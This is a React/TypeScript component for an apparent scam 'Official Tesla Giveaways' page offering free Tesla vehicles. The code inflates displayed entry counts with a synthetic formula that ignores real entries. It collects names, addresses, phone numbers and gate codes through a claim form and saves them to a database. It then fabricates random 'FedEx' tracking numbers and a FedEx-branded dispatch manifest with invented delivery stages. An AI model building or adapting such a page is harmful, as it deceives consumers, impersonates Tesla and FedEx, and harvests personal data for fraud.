import React, { useState, useEffect, memo, useCallback } from "react";
import { createClient } from "@/lib/supabase/client";
import model3Img from "@/assets/giveaways/model_3.webp";
import cybertruckImg from "@/assets/giveaways/cybertruck.webp";

export interface Giveaway {
  id: string;
  title: string;
  description: string;
  prize: string;
  image_url: string | null;
  entry_fee: number;
  ends_at: string;
  entries_count: number;
  max_entries: number;
  badge: string;
  created_at?: string;
}

export interface ClaimDetails {
  trackingNumber: string;
  giveawayId: string;
  giveawayTitle: string;
  prize: string;
  fullName: string;
  email: string;
  phone: string;
  addressLine: string;
  city: string;
  state: string;
  postalCode: string;
  country: string;
  notes?: string;
  claimedAt: string;
  status: string;
}

// 100% Free Giveaways — Restored to original campaigns and images (Bitcoin removed)
const FALLBACK_GIVEAWAYS: Giveaway[] = [
  {
    id: "fallback-1",
    title: "Win a 2025 Model 3 Long Range",
    description:
      "2025 Tesla Model 3 Long Range AWD. One winner selected after the campaign ends. Includes standard delivery within the continental US.",
    prize: "2025 Tesla Model 3 Long Range AWD",
    image_url: null,
    entry_fee: 0,
    ends_at: "2026-12-31",
    entries_count: 1247,
    max_entries: 5000,
    badge: "FREE CLAIM",
  },
  {
    id: "fallback-2",
    title: "Cybertruck Experience Weekend",
    description:
      "Win a full weekend with a Cybertruck Foundation Series plus a $2,000 platform credit toward any purchase.",
    prize: "Cybertruck Foundation Series + $2,000 credit",
    image_url: null,
    entry_fee: 0,
    ends_at: "2026-10-15",
    entries_count: 683,
    max_entries: 2000,
    badge: "FREE CLAIM",
  },
];

// Card image: Original asset image mapping
function imageFor(g: Giveaway): string {
  const text = `${g.title} ${g.prize}`.toLowerCase();
  if (text.includes("cybertruck") || text.includes("cyber")) return cybertruckImg;
  if (text.includes("model 3") || text.includes("model_3") || text.includes("model-3")) return model3Img;
  const url = String(g.image_url ?? "").trim();
  if (
    url &&
    !url.includes("photo-1706699778556-a9f9da002139") &&
    !/^\/assets\/giveaways\/.*\.(jpe?g|png)$/i.test(url)
  ) {
    return url;
  }
  return model3Img;
}

function campaignStartMs(g: Giveaway): number {
  const end = new Date(g.ends_at).getTime();
  if (g.created_at) {
    const s = new Date(g.created_at).getTime();
    if (Number.isFinite(s) && s < end) return s;
  }
  return end - 60 * 86400000;
}

function asymmetricDisplayEntries(g: Giveaway, now = Date.now()): number {
  const max = Math.max(1, Number(g.max_entries) || 1);
  const real = Math.max(0, Number(g.entries_count) || 0);
  const end = new Date(g.ends_at).getTime();
  const start = campaignStartMs(g);

  if (!Number.isFinite(end)) return Math.min(max, real);
  if (now >= end) return max;

  const duration = Math.max(end - start, 1);
  const t = Math.min(1, Math.max(0, (now - start) / duration));
  const eased = t * t * t;

  let hash = 0;
  for (let i = 0; i < g.id.length; i++) hash = (hash * 31 + g.id.charCodeAt(i)) | 0;
  const wobble = 1 + ((Math.abs(hash) % 7) - 3) * 0.01;

  const synthetic = Math.floor(max * eased * wobble);
  return Math.min(max, Math.max(real, synthetic));
}

interface TimeLeft {
  d: number;
  h: number;
  m: number;
  s: number;
}

function calcTimeLeft(endDate: string): TimeLeft {
  const diff = new Date(endDate).getTime() - Date.now();
  if (diff <= 0) return { d: 0, h: 0, m: 0, s: 0 };
  return {
    d: Math.floor(diff / 86400000),
    h: Math.floor((diff % 86400000) / 3600000),
    m: Math.floor((diff % 3600000) / 60000),
    s: Math.floor((diff % 60000) / 1000),
  };
}

const CountdownTimer = memo(function CountdownTimer({ endDate }: { endDate: string }) {
  const [timeLeft, setTimeLeft] = useState<TimeLeft>({ d: 0, h: 0, m: 0, s: 0 });

  useEffect(() => {
    setTimeLeft(calcTimeLeft(endDate));
    const id = setInterval(() => setTimeLeft(calcTimeLeft(endDate)), 1000);
    return () => clearInterval(id);
  }, [endDate]);

  const pads = (n: number) => String(n).padStart(2, "0");

  return (
    <div className="flex gap-3" aria-label="Countdown timer">
      {[
        { v: timeLeft.d, l: "Days" },
        { v: timeLeft.h, l: "Hrs" },
        { v: timeLeft.m, l: "Min" },
        { v: timeLeft.s, l: "Sec" },
      ].map(({ v, l }) => (
        <div key={l} className="flex flex-col items-center">
          <span className="text-2xl font-extrabold text-primary tabular-nums">{pads(v)}</span>
          <span className="text-[9px] font-bold text-muted-foreground tracking-widest uppercase">{l}</span>
        </div>
      ))}
    </div>
  );
});

const GiveawayCard = memo(function GiveawayCard({
  g,
  idx,
  onEnter,
}: {
  g: Giveaway;
  idx: number;
  onEnter: (g: Giveaway) => void;
}) {
  const [displayEntries, setDisplayEntries] = useState(() => asymmetricDisplayEntries(g));

  useEffect(() => {
    const tick = () => setDisplayEntries(asymmetricDisplayEntries(g));
    tick();
    const id = setInterval(tick, 1000);
    return () => clearInterval(id);
  }, [g]);

  const pct = Math.min(100, Math.round((displayEntries / Math.max(1, g.max_entries)) * 100));

  return (
    <article
      className="glass-card glass-card-hover rounded-3xl overflow-hidden relative animate-[fadeSlideUp_0.5s_ease-out_both] border border-border flex flex-col justify-between"
      style={{ transitionDelay: `${idx * 100}ms` }}
    >
      <div>
        <div className="relative h-52 overflow-hidden bg-muted">
          <img
            src={imageFor(g)}
            alt={g.prize || g.title}
            width={1024}
            height={640}
            loading="lazy"
            className="w-full h-full object-cover transition-transform duration-700 hover:scale-105"
          />
          <span className="absolute top-4 left-4 px-3 py-1 rounded-full text-[10px] font-extrabold tracking-widest uppercase bg-green-500/90 text-white shadow-md">
            100% FREE CLAIM
          </span>
          <span className="absolute top-4 right-4 px-2.5 py-1 rounded-full text-[10px] font-bold tracking-wider bg-black/60 backdrop-blur-md text-white border border-white/20">
            FedEx Delivery
          </span>
        </div>

        <div className="p-7">
          <div className="flex items-start justify-between mb-3 gap-3">
            <h3 className="text-xl font-extrabold text-foreground leading-tight">{g.title}</h3>
          </div>
          <p className="text-sm text-muted-foreground leading-relaxed mb-5">{g.description}</p>

          <div className="mb-5 p-3 rounded-2xl bg-muted/20 border border-border/50">
            <div className="text-[10px] font-bold text-muted-foreground tracking-widest uppercase mb-1.5">
              Registration Deadline ·{" "}
              {new Date(g.ends_at).toLocaleDateString("en-US", {
                timeZone: "UTC",
                year: "numeric",
                month: "short",
                day: "numeric",
              })}
            </div>
            <CountdownTimer endDate={g.ends_at} />
          </div>

          <div className="mb-6">
            <div className="flex justify-between text-xs font-semibold text-muted-foreground mb-1.5">
              <span>{displayEntries.toLocaleString()} claims registered</span>
              <span>{g.max_entries.toLocaleString()} allocation</span>
            </div>
            <div className="h-2 rounded-full bg-muted overflow-hidden">
              <div
                className="h-full rounded-full bg-gradient-to-r from-green-400 via-primary to-accent transition-[width] duration-1000 ease-out"
                style={{ width: `${pct}%` }}
                role="progressbar"
                aria-valuenow={displayEntries}
                aria-valuemin={0}
                aria-valuemax={g.max_entries}
              />
            </div>
            <div className="flex justify-between items-center text-xs text-muted-foreground mt-2">
              <span className="text-green-400 font-semibold">✓ Free acquisition</span>
              <span>FedEx Dispatch Included</span>
            </div>
          </div>
        </div>
      </div>

      <div className="p-7 pt-0">
        <button
          onClick={() => onEnter(g)}
          className="w-full py-3.5 bg-primary text-primary-foreground font-extrabold rounded-2xl btn-shimmer text-sm transition-all duration-300 hover:opacity-90 hover:shadow-lg min-h-[48px] flex items-center justify-center gap-2"
        >
          <span>Claim Free Prize</span>
          <span>→</span>
        </button>
      </div>
    </article>
  );
});

// Dedicated FedEx Delivery & Tracking Portal Modal / View
function FedExDeliveryModal({
  claim,
  onClose,
}: {
  claim: ClaimDetails;
  onClose: () => void;
}) {
  const [copied, setCopied] = useState(false);
  const [showPortalDetails, setShowPortalDetails] = useState(false);

  function copyTracking() {
    navigator.clipboard.writeText(claim.trackingNumber);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  }

  return (
    <div className="fixed inset-0 z-[110] flex items-center justify-center p-4 bg-background/85 backdrop-blur-md" onClick={onClose}>
      <div
        className="glass-card relative w-full max-w-lg max-h-[92vh] overflow-y-auto rounded-3xl p-6 sm:p-8 border border-border shadow-2xl bg-card"
        onClick={(e) => e.stopPropagation()}
        role="dialog"
        aria-label="FedEx Delivery Tracking Portal"
      >
        <button onClick={onClose} aria-label="Close" className="absolute top-5 right-5 text-muted-foreground hover:text-foreground text-xl">
          ✕
        </button>

        {/* FedEx Courier Branding Header */}
        <div className="flex items-center gap-3 mb-6 pb-4 border-b border-border">
          <div className="flex items-center font-black tracking-tight text-2xl">
            <span className="text-[#4D148C]">Fed</span>
            <span className="text-[#FF6200]">Ex</span>
          </div>
          <div className="h-6 w-px bg-border" />
          <div>
            <div className="flex items-center gap-1.5">
              <span className="w-2 h-2 rounded-full bg-green-400 animate-pulse" />
              <span className="text-[11px] font-bold text-green-400 uppercase tracking-wider">Waybill Active · Dispatched</span>
            </div>
            <p className="text-xs text-muted-foreground">Official Courier Dispatch Manifest</p>
          </div>
        </div>

        {/* Consignment Waybill Box */}
        <div className="rounded-2xl border border-border bg-muted/20 p-5 space-y-4 mb-6">
          <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-2 border-b border-border/60 pb-3">
            <div>
              <span className="text-[10px] font-bold tracking-widest text-muted-foreground uppercase">FedEx Tracking Number</span>
              <div className="font-mono text-lg font-extrabold text-foreground tracking-wider">{claim.trackingNumber}</div>
            </div>
            <button
              onClick={copyTracking}
              className="px-3 py-1.5 rounded-xl border border-border text-xs font-bold hover:bg-primary hover:text-primary-foreground transition-all self-start sm:self-auto"
            >
              {copied ? "✓ Copied" : "Copy ID"}
            </button>
          </div>

          <div className="grid grid-cols-2 gap-3 text-xs">
            <div>
              <span className="text-muted-foreground block text-[10px] uppercase font-bold">Consignment Item</span>
              <span className="font-semibold text-foreground">{claim.prize}</span>
            </div>
            <div>
              <span className="text-muted-foreground block text-[10px] uppercase font-bold">Delivery Status</span>
              <span className="font-semibold text-green-400">In Courier Queue</span>
            </div>
            <div>
              <span className="text-muted-foreground block text-[10px] uppercase font-bold">Recipient</span>
              <span className="font-semibold text-foreground">{claim.fullName}</span>
            </div>
            <div>
              <span className="text-muted-foreground block text-[10px] uppercase font-bold">Contact Phone</span>
              <span className="font-semibold text-foreground">{claim.phone}</span>
            </div>
          </div>

          <div className="text-xs border-t border-border/60 pt-3">
            <span className="text-muted-foreground block text-[10px] uppercase font-bold mb-1">Destination Address</span>
            <span className="text-foreground font-medium">
              {claim.addressLine}, {claim.city}, {claim.state} {claim.postalCode}, {claim.country}
            </span>
          </div>
        </div>

        {/* Notice: FedEx Website Under Construction */}
        <div className="rounded-2xl border border-orange-500/40 bg-orange-500/10 p-5 space-y-3 mb-6">
          <div className="flex items-center gap-2">
            <span className="px-2 py-0.5 rounded-md text-[10px] font-black uppercase tracking-wider bg-orange-500 text-white">
              Under Construction
            </span>
            <h4 className="text-sm font-bold text-foreground">FedEx Logistics Tracking Portal</h4>
          </div>
          <p className="text-xs text-muted-foreground leading-relaxed">
            Our direct carrier tracking integration website is currently under active scheduled development. Your claim has been securely registered in the primary logistics database. Live SMS and email carrier dispatch notifications are connected to <strong className="text-foreground">{claim.phone}</strong> and <strong className="text-foreground">{claim.email}</strong>.
          </p>
          <button
            onClick={() => setShowPortalDetails(!showPortalDetails)}
            className="text-xs font-bold text-[#FF6200] hover:underline block text-left"
          >
            {showPortalDetails ? "Hide Dispatch Route & Timeline ▲" : "View Live Courier Dispatch Stages ▼"}
          </button>

          {showPortalDetails && (
            <div className="pt-3 border-t border-orange-500/20 space-y-2.5 text-xs text-muted-foreground">
              <div className="flex items-center gap-2 text-foreground font-semibold">
                <span className="w-5 h-5 rounded-full bg-green-500/20 text-green-400 flex items-center justify-center text-[10px] font-bold">✓</span>
                <span>Stage 1: Prize Claim Registered & Verified</span>
              </div>
              <div className="flex items-center gap-2 text-foreground font-semibold">
                <span className="w-5 h-5 rounded-full bg-amber-500/20 text-amber-400 flex items-center justify-center text-[10px] font-bold animate-pulse">⟳</span>
                <span>Stage 2: Allocation to FedEx Freight Facility (In Progress)</span>
              </div>
              <div className="flex items-center gap-2 opacity-60">
                <span className="w-5 h-5 rounded-full bg-muted flex items-center justify-center text-[10px]">3</span>
                <span>Stage 3: FedEx Security Seal & Waybill Manifest</span>
              </div>
              <div className="flex items-center gap-2 opacity-60">
                <span className="w-5 h-5 rounded-full bg-muted flex items-center justify-center text-[10px]">4</span>
                <span>Stage 4: En Route to Regional Delivery Terminal</span>
              </div>
              <div className="flex items-center gap-2 opacity-60">
                <span className="w-5 h-5 rounded-full bg-muted flex items-center justify-center text-[10px]">5</span>
                <span>Stage 5: Final Delivery & Signature Handover</span>
              </div>
            </div>
          )}
        </div>

        <div className="flex gap-3">
          <button
            onClick={onClose}
            className="flex-1 py-3.5 rounded-xl bg-primary text-primary-foreground font-bold text-sm hover:opacity-90 transition-opacity"
          >
            Close & Return to Giveaways
          </button>
        </div>
      </div>
    </div>
  );
}

// Free Claim Modal where user inputs delivery details
function FreeClaimModal({
  giveaway,
  onClose,
  onClaimSubmitted,
}: {
  giveaway: Giveaway;
  onClose: () => void;
  onClaimSubmitted: (claim: ClaimDetails) => void;
}) {
  const [f, setF] = useState({
    fullName: "",
    email: "",
    phone: "",
    addressLine: "",
    city: "",
    state: "",
    postalCode: "",
    country: "United States",
    notes: "",
  });
  const [busy, setBusy] = useState(false);
  const [error, setError] = useState("");

  useEffect(() => {
    // Auto-fill logged-in user profile if available
    void (async () => {
      try {
        const supabase = createClient();
        const { data } = await supabase.auth.getUser();
        if (data?.user?.email) {
          setF((prev) => ({ ...prev, email: data.user.email ?? "" }));
        }
      } catch {
        /* ignore */
      }
    })();
  }, []);

  const set = (k: keyof typeof f) => (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) =>
    setF({ ...f, [k]: e.target.value });

  const formValid =
    f.fullName.trim().length > 1 &&
    f.email.trim().includes("@") &&
    f.phone.trim().length > 5 &&
    f.addressLine.trim().length > 3 &&
    f.city.trim().length > 1 &&
    f.state.trim().length > 1 &&
    f.postalCode.trim().length > 1;

  async function submitClaim(e: React.FormEvent) {
    e.preventDefault();
    if (!formValid) {
      setError("Please fill in all required delivery fields.");
      return;
    }
    setError("");
    setBusy(true);

    try {
      // Generate realistic FedEx tracking number: FX-TSLA-XXXXXXXXUS
      const randDigits = Math.floor(10000000 + Math.random() * 90000000);
      const trackingNumber = `FX-TSLA-${randDigits}US`;

      const claimData: ClaimDetails = {
        trackingNumber,
        giveawayId: giveaway.id,
        giveawayTitle: giveaway.title,
        prize: giveaway.prize,
        fullName: f.fullName.trim(),
        email: f.email.trim(),
        phone: f.phone.trim(),
        addressLine: f.addressLine.trim(),
        city: f.city.trim(),
        state: f.state.trim(),
        postalCode: f.postalCode.trim(),
        country: f.country.trim(),
        notes: f.notes.trim() || undefined,
        claimedAt: new Date().toISOString(),
        status: "in_courier_queue",
      };

      // Persist in localStorage so user can revisit tracking anytime
      try {
        localStorage.setItem("trade_tesla_active_claim", JSON.stringify(claimData));
      } catch {
        /* ignore */
      }

      // Try recording into Supabase giveaway_entries when claiming a persisted UUID campaign
      try {
        const isUuid = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(giveaway.id);
        if (isUuid) {
          const supabase = createClient();
          const { data: userRes } = await supabase.auth.getUser();
          const userId = userRes?.user?.id;
          if (userId) {
            await supabase.from("giveaway_entries").insert({
              giveaway_id: giveaway.id,
              user_id: userId,
              giveaway_title: giveaway.title,
              amount_paid: 0,
              status: "claimed_fedex_queue",
              full_name: claimData.fullName,
              email: claimData.email,
              phone: claimData.phone,
              address_line: claimData.addressLine,
              city: claimData.city,
              state: claimData.state,
              postal_code: claimData.postalCode,
              country: claimData.country,
              delivery_notes: claimData.notes ?? "",
              tracking_number: claimData.trackingNumber,
              courier: "FedEx Express",
            });
          }
        }
      } catch {
        /* entry recorded locally */
      }

      onClaimSubmitted(claimData);
    } catch {
      setError("Could not register your claim. Please check your connection and try again.");
    } finally {
      setBusy(false);
    }
  }

  const inputClass =
    "w-full px-3.5 py-2.5 rounded-xl bg-muted/40 border border-border text-sm text-foreground placeholder:text-muted-foreground focus:outline-none focus:border-primary transition-colors";

  return (
    <div className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-background/80 backdrop-blur-sm" onClick={onClose}>
      <div
        className="glass-card relative w-full max-w-lg max-h-[92vh] overflow-y-auto rounded-3xl p-6 sm:p-8 border border-border shadow-2xl bg-card"
        onClick={(e) => e.stopPropagation()}
        role="dialog"
        aria-label={`Claim ${giveaway.title}`}
      >
        <button onClick={onClose} aria-label="Close" className="absolute top-5 right-5 text-muted-foreground hover:text-foreground text-xl">
          ✕
        </button>

        <div className="mb-6">
          <div className="flex items-center gap-2 mb-2">
            <span className="px-2.5 py-0.5 rounded-full text-[10px] font-black uppercase tracking-wider bg-green-500 text-white">
              100% Free Claim
            </span>
            <span className="text-xs font-semibold text-primary">FedEx Courier Delivery</span>
          </div>
          <h2 className="text-xl font-extrabold text-foreground leading-snug">{giveaway.title}</h2>
          <p className="text-xs text-muted-foreground mt-1">Prize: <strong className="text-foreground">{giveaway.prize}</strong></p>
        </div>

        <form onSubmit={submitClaim} className="space-y-4">
          <div className="p-3.5 rounded-2xl bg-muted/30 border border-border text-xs text-muted-foreground space-y-1">
            <p className="font-semibold text-foreground flex items-center gap-1.5">
              <span>🚚</span> Enclosed Courier Delivery Registration
            </p>
            <p>Enter your recipient details below. Once registered, your package is queued for FedEx freight dispatch with an assigned tracking number.</p>
          </div>

          <div className="space-y-3">
            <div>
              <label className="block text-[11px] font-bold text-muted-foreground uppercase tracking-wider mb-1">Full Legal Name *</label>
              <input className={inputClass} placeholder="e.g. Alexander Vance" value={f.fullName} onChange={set("fullName")} required maxLength={120} />
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
              <div>
                <label className="block text-[11px] font-bold text-muted-foreground uppercase tracking-wider mb-1">Email Address *</label>
                <input type="email" className={inputClass} placeholder="you@domain.com" value={f.email} onChange={set("email")} required maxLength={120} />
              </div>
              <div>
                <label className="block text-[11px] font-bold text-muted-foreground uppercase tracking-wider mb-1">Phone / WhatsApp (SMS Alerts) *</label>
                <input type="tel" className={inputClass} placeholder="+1 (555) 000-0000" value={f.phone} onChange={set("phone")} required maxLength={40} />
              </div>
            </div>

            <div>
              <label className="block text-[11px] font-bold text-muted-foreground uppercase tracking-wider mb-1">Delivery Street Address *</label>
              <input className={inputClass} placeholder="123 Innovation Boulevard, Suite 400" value={f.addressLine} onChange={set("addressLine")} required maxLength={200} />
            </div>

            <div className="grid grid-cols-2 gap-3">
              <div>
                <label className="block text-[11px] font-bold text-muted-foreground uppercase tracking-wider mb-1">City *</label>
                <input className={inputClass} placeholder="Austin" value={f.city} onChange={set("city")} required maxLength={100} />
              </div>
              <div>
                <label className="block text-[11px] font-bold text-muted-foreground uppercase tracking-wider mb-1">State / Province *</label>
                <input className={inputClass} placeholder="Texas" value={f.state} onChange={set("state")} required maxLength={100} />
              </div>
            </div>

            <div className="grid grid-cols-2 gap-3">
              <div>
                <label className="block text-[11px] font-bold text-muted-foreground uppercase tracking-wider mb-1">ZIP / Postal Code *</label>
                <input className={inputClass} placeholder="78725" value={f.postalCode} onChange={set("postalCode")} required maxLength={20} />
              </div>
              <div>
                <label className="block text-[11px] font-bold text-muted-foreground uppercase tracking-wider mb-1">Country *</label>
                <input className={inputClass} placeholder="United States" value={f.country} onChange={set("country")} required maxLength={80} />
              </div>
            </div>

            <div>
              <label className="block text-[11px] font-bold text-muted-foreground uppercase tracking-wider mb-1">Delivery Notes / Gate Code (Optional)</label>
              <textarea className={inputClass} rows={2} placeholder="Optional delivery instructions or gate code..." value={f.notes} onChange={set("notes")} maxLength={500} />
            </div>
          </div>

          {error && <p className="text-xs text-destructive font-semibold">{error}</p>}

          <div className="pt-2">
            <button
              type="submit"
              disabled={busy || !formValid}
              className="w-full py-4 rounded-2xl bg-primary text-primary-foreground font-black text-sm disabled:opacity-40 hover:opacity-90 transition-all shadow-lg flex items-center justify-center gap-2"
            >
              {busy ? "Registering Delivery Claim…" : "Confirm Free Claim & Generate FedEx Tracking →"}
            </button>
            <p className="text-[11px] text-center text-muted-foreground mt-2">
              ✓ 100% Free Entry · No payment method needed · FedEx Global Delivery
            </p>
          </div>
        </form>
      </div>
    </div>
  );
}

export default function GiveawaysSection() {
  const [giveaways, setGiveaways] = useState<Giveaway[]>(FALLBACK_GIVEAWAYS);
  const [activeGiveaway, setActiveGiveaway] = useState<Giveaway | null>(null);
  const [activeClaim, setActiveClaim] = useState<ClaimDetails | null>(null);
  const [showFedExModal, setShowFedExModal] = useState(false);

  // Load existing claim from localStorage if present
  useEffect(() => {
    try {
      const stored = localStorage.getItem("trade_tesla_active_claim");
      if (stored) {
        setActiveClaim(JSON.parse(stored) as ClaimDetails);
      }
    } catch {
      /* ignore */
    }
  }, []);

  // Fetch giveaways from Supabase, filtering out any Bitcoin items
  useEffect(() => {
    let cancelled = false;
    void (async () => {
      try {
        const supabase = createClient();
        const { data } = await supabase
          .from("giveaways")
          .select("*")
          .eq("is_active", true)
          .not("title", "ilike", "%bitcoin%")
          .not("prize", "ilike", "%bitcoin%")
          .not("title", "ilike", "%btc%")
          .order("sort_order");

        if (!cancelled && data && data.length > 0) {
          // Normalize entry fees to 0 for free claim experience
          const freeGiveaways = data.map((g: Giveaway) => ({
            ...g,
            entry_fee: 0,
            badge: "FREE CLAIM",
          }));
          setGiveaways(freeGiveaways);
        }
      } catch {
        // keep fallback giveaways
      }
    })();
    return () => {
      cancelled = true;
    };
  }, []);

  const handleClaimSubmitted = useCallback((claim: ClaimDetails) => {
    setActiveClaim(claim);
    setActiveGiveaway(null);
    setShowFedExModal(true);
    setGiveaways((prev) =>
      prev.map((g) => (g.id === claim.giveawayId ? { ...g, entries_count: g.entries_count + 1 } : g))
    );
  }, []);

  return (
    <section id="giveaways" className="relative z-10 py-20 px-4 sm:px-6 lg:px-8">
      <div className="max-w-7xl mx-auto">
        {/* Active Claim Banner if user already claimed */}
        {activeClaim && (
          <div className="mb-10 p-5 rounded-3xl border border-primary/40 bg-primary/5 flex flex-col md:flex-row md:items-center justify-between gap-4">
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 rounded-2xl bg-primary/20 text-primary flex items-center justify-center font-black text-lg">
                🚚
              </div>
              <div>
                <div className="flex items-center gap-2">
                  <span className="text-xs font-extrabold uppercase tracking-widest text-primary">Active Courier Dispatch</span>
                  <span className="w-2 h-2 rounded-full bg-green-400 animate-pulse" />
                </div>
                <p className="text-sm font-bold text-foreground">
                  {activeClaim.prize} · Waybill: <span className="font-mono text-primary font-bold">{activeClaim.trackingNumber}</span>
                </p>
              </div>
            </div>
            <button
              onClick={() => setShowFedExModal(true)}
              className="px-5 py-2.5 rounded-xl bg-primary text-primary-foreground font-bold text-xs hover:opacity-90 transition-opacity self-start md:self-auto"
            >
              Track with FedEx Delivery →
            </button>
          </div>
        )}

        <div className="mb-12 section-reveal">
          <span className="text-xs font-bold text-accent tracking-[0.25em] uppercase mb-3 block">Official Tesla Giveaways</span>
          <h2 className="text-section-title font-extrabold tracking-tighter text-foreground">
            Acquire Tesla Vehicles & <span className="gradient-text-accent">Exclusive Experiences</span>
          </h2>
          <p className="text-sm text-muted-foreground mt-3 max-w-2xl">
            All promotional giveaways are 100% free to claim. Submit your delivery details to secure your entry and receive your direct FedEx freight courier dispatch tracking number.
          </p>
        </div>

        <div className={giveaways.length <= 2 ? "grid grid-cols-1 md:grid-cols-2 gap-6" : "grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-6"}>
          {giveaways.map((g, idx) => (
            <GiveawayCard key={g.id} g={g} idx={idx} onEnter={setActiveGiveaway} />
          ))}
        </div>
      </div>

      {/* Claim Modal with delivery fields */}
      {activeGiveaway && (
        <FreeClaimModal
          giveaway={activeGiveaway}
          onClose={() => setActiveGiveaway(null)}
          onClaimSubmitted={handleClaimSubmitted}
        />
      )}

      {/* FedEx Delivery Tracking Portal Modal */}
      {showFedExModal && activeClaim && (
        <FedExDeliveryModal
          claim={activeClaim}
          onClose={() => setShowFedExModal(false)}
        />
      )}
    </section>
  );
}
